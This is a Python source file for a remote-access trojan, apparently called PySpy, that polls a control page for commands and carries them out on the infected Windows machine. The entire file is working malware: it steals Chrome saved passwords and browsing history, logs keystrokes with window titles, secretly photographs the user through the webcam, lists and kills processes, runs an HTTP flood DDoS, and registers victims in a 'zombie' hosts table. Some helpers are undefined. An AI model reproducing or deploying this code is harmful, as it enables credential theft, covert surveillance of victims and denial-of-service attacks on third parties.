
# MYSQL Table:
# - cmdhist [table]
# - hosts [table]
# - keylog [table]
# - process_table [table]

import requests
from time import sleep
import ctypes
from ctypes import *
import pyautogui 
import sys
import os
import wx
import socket
import threading
import webbrowser
import smtplib
import operator
import pyHook, pythoncom, sys, logging
from shutil import copyfile
import shutil
import subprocess
import win32com.client
from win32com.shell import shell, shellcon
from collections import OrderedDict
import matplotlib.pyplot as plt
import sqlite3
import win32crypt
import requests
from random import randint
import random
import time
import string
import cv2
import platform
import wmi
import signal

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

from threading import Thread
from urllib import urlopen
from atexit import register
from os import _exit
from sys import stdout, argv

# Config
shell = win32com.client.Dispatch("WScript.Shell")
extr = []
chrpw = []
chrpwStr = ""
keyCheck = 0
keyCount = 0

# Checker Variables
q = 'on'
AliveCount = 0

# Log List [Keylog]
grab = []

# Access DLLs [Keylog]
user32 = windll.user32
kernel32 = windll.kernel32
winTitle = None

# Blank Conversion Variable
reslt = ''

def addToZombieTable():
	platName = platform.node()
	IPCatch = socket.gethostbyname(socket.gethostname())
	today = str(date.today())

	# Perfect auto-inc for DB
	from mysql import connector
	con = connector.Connect(user='root',password='',database='blackdoor',host='localhost')
	cur=con.cursor()

	cur.execute("SELECT * FROM hosts")
	cur.fetchall()
	rc = cur.rowcount
	#print rc
	rc2 = rc + 1

	cur.execute("""insert into hosts values (%s, '%s', '%s', '%s')""" % (rc2,IPCatch, platName,today))
	con.commit()
	con.close()
	print "Broadcast to the mother ship!"

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def openCDDrive():
	ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)

def setWallpaper(wallSet):
	SPI_SETDESKWALLPAPER = 20 
	ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, wallSet , 0)

# --- Browser History Extraction START ---


# Grab Full History
def analyze(results):
	global arrHist
	arrHist = []

	for site, count in sites_count_sorted.items():
		arrHist.append(site)
	historyExtracted(arrHist)

# Pass history results for output
def historyExtracted(histList):
	print "\n\n-----------------------"
	print "History Search Results:"
	print "-----------------------\n"
	fugVar = ""
	for i in histList:
		fugVar = fugVar + str(i) + "\n"
	print "\nExtraction Complete!\n"
	print fugVar
	# pass fugVar

def chromeFug():
	# Chrome's path
	global sites_count_sorted
	data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
	files = os.listdir(data_path)

	history_db = os.path.join(data_path, 'history')

	# Using SQL to query Chrome's DB
	c = sqlite3.connect(history_db)
	cursor = c.cursor()
	select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
	cursor.execute(select_statement)

	results = cursor.fetchall() #tuple

	# Dictionary for iterations
	sites_count = {}

	for url, count in results:
		url = parse(url)
		if url in sites_count:
			sites_count[url] += 1
		else:
			sites_count[url] = 1

	sites_count_sorted = OrderedDict(sorted(sites_count.items(), key=operator.itemgetter(1), reverse=True))

def EPE_Main():
	# Kill Chrome process for password extraction
	os.system('taskkill /F /IM chrome.exe')

def chrme():
    global chrpw
    global chrpwStr

    data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"

    login_db = os.path.join(data_path, 'Login Data')

    c = sqlite3.connect(login_db)
    cursor = c.cursor()
    select_statement = "SELECT origin_url, username_value, password_value FROM logins"
    cursor.execute(select_statement)

    login_data = cursor.fetchall()

    credential = {}

    for url, user_name, pwd, in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0) 
        credential[url] = (user_name, pwd[1])

    for url, credentials in credential.iteritems():
        if credentials[1]:
        	chrpw.append("%s - %s : %s" % (url, credentials[0].encode('utf-8'), credentials[1]))
        	chrpwStr = chrpwStr + "%s\n" % ("%s - %s : %s" % (url, credentials[0].encode('utf-8'), credentials[1]))

# --- Browser History Extraction END ---


# --- Keylogger START ---
def OnKeyboardEvent(event):
	# globalize for Window Title Condition
	global winTitle
	global hooks_manager
	global bckChck
	global reslt
	global hooks_manager

	# If window title is different, then call title function
	if event.WindowName != winTitle:
		winTitle = event.WindowName
		getWindowTitle()

	# Keylog related code...
	logging.basicConfig(level=logging.DEBUG, format='%(message)s')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii) + " - %s" % len(grab))
	grab.append( chr(event.Ascii))

	# This condition checks how many keystrokes detected
	# When X amount of keystrokes detected, send key list to email function
	if len(grab) >= 150:
		print '\ndelivering keys via GMAIL'

		# Perfect auto-inc for DB
		from mysql import connector
		con = connector.Connect(user='root',password='',database='blackdoor',host='localhost')
		cur=con.cursor()

		cur.execute("SELECT * FROM keylog")
		cur.fetchall()
		rc = cur.rowcount
		#print rc
		rc2 = rc + 1

		for cont in grab:
			reslt = reslt + cont

		reslt = reslt.strip()

		reslt = reslt.replace("'", '')
		print reslt

		cur.execute("""insert into keylog values (%s, '%s')""" % (rc2,reslt))
		con.commit()
		con.close()
		print "Keys uploaded successfully."

		# Clear list for more logging
		del grab[:]
		reslt = ''

		# Unhook after keys sent
		hooks_manager.UnhookKeyboard()

		mainRoutine()
	else:
		pass

	return True
    
# Detect Window Title
def getWindowTitle():
	# Get window in focus
	hwnd = user32.GetForegroundWindow()

	# Extract the window's title
	title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(title),512)
	
	# Display title in console
	print "\n\n[ %s ]\n\n" % ( title.value)
	grab.append("\n\n[ " + title.value + " ]\n\n")
	
	# Close
	kernel32.CloseHandle(hwnd)
	return True

# --- Keylogger STOP ---

# --- DoS Procedure START ---
def auto_send_request(server_dd, number_of_requests=10):
    global inc
    requestsCheck = (requestsDD - 1)
    for z in range(number_of_requests):
        try:
            urlopen(server_dd)
            inc = inc + 1
            if inc % 100 == 0:
                print "Requests: %s." % (inc)
            if inc % 1000 == 0:
				print "\n%s blasted with %s requests!" % (server_dd,inc)
				#r = requests.get(cntrlPanel)
				#x = r.content
				#z = find_between(x,'data-aria-label-part="0">','</p>')
				#if z == "ddhalt":
				#	print "Stopper detected"
				#	break
        except IOError:
            print "Error - Bad host!\n" 
        if inc >= requestsCheck:
            print "Finished Stress Procedure"

def flood(url, number_of_requests = 1000, number_of_threads = 50):  
    number_of_requests_per_thread = int(number_of_requests/number_of_threads)
    try:
        for x in range(number_of_threads):
            Thread(target=auto_send_request, args=(url, number_of_requests_per_thread)).start()
    except:
        print("\n[E]\n")
    print "\nDone %i requests on %s" % (number_of_requests, url)

def stressErr():
	print "Target error. Check link and try again"

def run(url4dd, num_req):    
    global requestsDD
    global inc
    inc = 0
    print "DoS Started."
    server_dds = url4dd
    requestsDD = int(num_req)
    flood(server_dds, requestsDD)

def ddos(ddsHost):
    xdd = ddsHost
    ydd = 10000000
    print "%s : %s" % (xdd,ydd)
    run(xdd,ydd)

# --- DoS Procedure END ---

# --- Procceses START ---
# Grab Current Running Processes with associated IDs
def procGet():
	global grab

	processesGathered = []
	proccesesStr = ""

	c = wmi.WMI ()

	for process in c.Win32_Process ():
	  processesGathered.append("%s - [%s]" % (process.Name,process.ProcessId))

	for pgathered in processesGathered:
		proccesesStr = proccesesStr + pgathered + "\n"

	print proccesesStr

	# Perfect auto-inc for DB
	from mysql import connector
	con = connector.Connect(user='root',password='',database='blackdoor',host='localhost')
	cur=con.cursor()

	cur.execute("SELECT * FROM process_table")
	cur.fetchall()
	rc = cur.rowcount
	#print rc
	rc2 = rc + 1

	cur.execute("""insert into process_table values (%s, '%s')""" % (rc2,proccesesStr))
	con.commit()
	con.close()
	print "Processes uploaded successfully."


# Terminate specific process by ID
def procTerminate(selID):
	os.kill(int(selID), signal.SIGTERM)
	print "Process #%s Terminated!" % (selID)

# --- Procceses END ---

# --- Webcam START ---

# Webcam Screenshot Capture
# Snap a photo of the person using the PC
def webcam_Capture():
	global usrHandle
	global envoDr

	cap = cv2.VideoCapture(0)

	ret, frame = cap.read()
	rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2BGRA)

	cv2.imshow('frame', rgb)
	
	if(platform.system()=="Linux"):
		print "Linux OS Detected!"

		# Save web cam screenshot...
		homedir = os.environ['HOME']
		envoDr = '%s/wc_ss.png' % (homedir)
		out = cv2.imwrite(envoDr, frame)

		print "Web cam screenshot saved!"

		cap.release()
		cv2.destroyAllWindows()
		# Deliver web cam screenshot...
		Downloader(envoDr)
		print "Web cam screenshot delivered!"
	elif(platform.system()=="Windows"):
		print "Windows OS Detected!"

		# Save web cam screenshot...
		usrHandle = os.environ['USERNAME']
		envoDr = 'C:\Users\%s\Downloads\wc_ss.png' % (usrHandle)
		out = cv2.imwrite(envoDr, frame)

		print "Web cam screenshot saved!"

		cap.release()
		cv2.destroyAllWindows()
		# Deliver web cam screenshot...
		Downloader(envoDr)
		print "Web cam screenshot delivered!"
	# Mac condition unfinished...
	elif(platform.system()=="Darwin"):
		print "Mac OS detected!"
		print "Unfinished section..."

# --- Webcam END ---

def processReq():
	global q
	global hooks_manager
	global sites_count_sorted

	processReq.page = requests.Session().get('http://127.0.0.1/sentinel.php')
	z = find_between( processReq.page.content,'sent">','</p>' ) 

	if q == z:
		pass
	
	elif q != z:
		if "ddos" in z:
			b = z[5:]
			try:
				print "DDoS Activated!"
				ddos(b)
			except:
				print "Error launching DDoS..."
			q = z
		if "alert" in z:
			b = z[6:]
			print "Alert sent!"
			ctypes.windll.user32.MessageBoxA(0, b, "PySpy", 0)
			q = z
		elif z == "open.cd":
			print "Open CD Found!"
			openCDDrive()
			q = z
		elif "navigate" in z:
			b = z[9:]
			webbrowser.open(b)
			print "Navigation redirect!"
			q = z
		elif z == "history":
			print "Extracting Chrome Browsing History..."
			try:
				EPE_Main()
				chromeFug()
				analyze(sites_count_sorted)
			except:
				print "History Extraction Failed."
			q = z
		elif z == "passwords":
			EPE_Main()
			chrme()
			q = z
		elif z == "processes":
			try:
				procGet()
			except:
				print "Error Gathering Processes..."
			q = z
		elif "wallpaper" in z:
			b = z[10:]
			print b
			setWallpaper(b)
			print "Wallpaper set."
			q = z
		elif z == "keylog":
			print "Keylogger enabled."
			hooks_manager = pyHook.HookManager()
			hooks_manager.KeyDown = OnKeyboardEvent
			hooks_manager.HookKeyboard()
			pythoncom.PumpMessages()
			q = z
		elif z == "idle":
			print "Idling..."
			q = z
		else:
			pass

#addToZombieTable()

def mainRoutine():
	global AliveCount

	print "Server's now alive."
	while(True):
		sleep(1)
		AliveCount = AliveCount + 1
		if AliveCount > 1:
			print "%s Secs" % (AliveCount)
		else:
			print "%s Sec" % (AliveCount)
		processReq()

mainRoutine()